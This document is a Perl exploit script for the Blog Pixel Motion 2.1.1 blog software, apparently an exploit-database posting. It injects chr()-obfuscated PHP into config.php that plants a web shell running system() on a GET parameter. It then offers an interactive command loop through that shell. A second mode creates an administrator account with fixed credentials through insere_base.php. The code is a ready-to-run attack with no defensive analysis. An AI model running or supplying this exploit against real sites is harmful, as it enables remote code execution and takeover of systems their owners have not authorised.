Blog Pixel Motion 2.1.1 PHP Code Execution / Create Admin Exploit
=================================================================



#!/usr/bin/perl
#
# Affected.scr..: Blog Pixel Motion V2.1.1
# Poc.ID........: 12060927
# Type..........: PHP Code Execution (stripslashes), SQL Injection (urldecode)
# Risk.level....: High
# Vendor.Status.: Unpatched
# Credits.......: DarkFig
#
# print "This exploit is for educational purpose only" x 999; exit;
#
use LWP::UserAgent;
use HTTP::Request::Common;
use HTTP::Response;
use Getopt::Long;
use strict;

print STDOUT "\n+", &#039;-&#039; x 60, "+\n";
print STDOUT "| Blog Pixel Motion V2.1.1 PHP Code Execution / Create Admin |\n";
print STDOUT &#039;+&#039;, &#039;-&#039; x 60, "+\n";

my($host,$path,$proxh,$proxu,$proxp,$choice,$cmd,$res,$re);
my $opt = GetOptions(
   &#039;host=s&#039;   =>  \$host,
   &#039;path=s&#039;   =>  \$path,
   &#039;proxh=s&#039;  =>  \$proxh,
   &#039;proxu=s&#039;  =>  \$proxu,
   &#039;proxp=s&#039;  =>  \$proxp,
   &#039;choice=s&#039; =>  \$choice);

if(!$host) {
    print STDOUT "|      Usage: ./zz.pl --host=[www] --path=[/] --choice=[0]   |\n";
    print STDOUT "|   [Choice.]  1=PHP_Code_Execution       2=Create_Admin     |\n";
    print STDOUT "|   [Options] --proxh=[ip] --proxu=[user] --proxp=[pwd]      |\n";
    print STDOUT &#039;+&#039;, &#039;-&#039; x 60, "+\a\n";
    exit(1);
}

if($host  !~ /http/) {$host = &#039;http://&#039;.$host;}
if($proxh !~ /http/ && $proxh != &#039;&#039;) {$proxh = &#039;http://&#039;.$proxh.&#039;/&#039;;}
if(!$path) {$path = &#039;/&#039;;}
if(!$choice) {$choice = 2;}

my $ua = LWP::UserAgent->new();
   $ua->agent(&#039;0xzilla&#039;);
   $ua->timeout(30);
   $ua->proxy([&#039;http&#039;] => $proxh) if $proxh;
   $re->proxy_authorization_basic($proxu, $proxp) if $proxp;

if($choice == 1) {

   $re = POST $host.$path.&#039;config.php&#039;, [
   &#039;nom_blog&#039;  => &#039;";
    $shcode  = chr(0x69).chr(0x66).chr(0x28).chr(0x69).chr(0x73).chr(0x73).chr(0x65);
    $shcode .= chr(0x74).chr(0x28).chr(0x24).chr(0x5F).chr(0x47).chr(0x45).chr(0x54);
    $shcode .= chr(0x5B).chr(0x27).chr(0x63).chr(0x6D).chr(0x64).chr(0x27).chr(0x5D);
    $shcode .= chr(0x29).chr(0x29).chr(0x7B).chr(0x73).chr(0x79).chr(0x73).chr(0x74);
    $shcode .= chr(0x65).chr(0x6D).chr(0x28).chr(0x73).chr(0x74).chr(0x72).chr(0x69);
    $shcode .= chr(0x70).chr(0x73).chr(0x6C).chr(0x61).chr(0x73).chr(0x68).chr(0x65);
    $shcode .= chr(0x73).chr(0x28).chr(0x24).chr(0x5F).chr(0x47).chr(0x45).chr(0x54);
    $shcode .= chr(0x5B).chr(0x27).chr(0x63).chr(0x6D).chr(0x64).chr(0x27).chr(0x5D);
    $shcode .= chr(0x29).chr(0x29).chr(0x3B).chr(0x7D).chr(0x0D).chr(0x0A);
    eval($shcode); die(); //&#039;];
    $ua->request($re);

    while(<STDIN>){
    chomp($cmd = $_);
    if($cmd eq &#039;exit&#039;) { exit(0); }
    $re = GET $host.$path.&#039;include/variables.php?cmd=&#039;.$cmd;
    $res = $ua->request($re);
    print STDOUT "\n\n".$res->content."\n\$sh: ";
    }


} else {

  $re = GET $host.$path.&#039;insere_base.php?login=woot&pass=t00w&#039;;
  $ua->request($re);
  print STDOUT "[+] Admin login.: woot\n";
  print STDOUT "[+] Admin passwd: t00w\n";
  print STDOUT &#039;+&#039;, &#039;-&#039; x 60, "+\n";

}



